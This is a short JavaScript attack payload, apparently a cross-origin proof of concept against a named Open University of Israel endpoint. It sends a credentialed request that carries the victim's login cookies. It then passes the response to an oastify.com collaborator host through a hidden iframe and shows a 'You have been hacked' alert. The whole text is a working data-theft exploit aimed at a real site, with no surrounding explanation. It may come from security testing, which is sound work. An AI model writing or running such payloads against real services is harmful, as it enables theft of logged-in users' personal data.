var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://opsrv.apps.openu.ac.il/MyOP/Person/HelloUser', true); 
req.withCredentials = true;
req.send();

function reqListener() {
    // Load the iframe
    var iframe = document.createElement('iframe');
    iframe.src = '//0jkju313fs0ejqhs4mrm2zarrix9lz9o.oastify.com/log?key=' + this.responseText;
    iframe.style.display = 'none';
    // Append the iframe to the document body
    document.body.appendChild(iframe);
    alert("You have been hacked by Itayst");
};
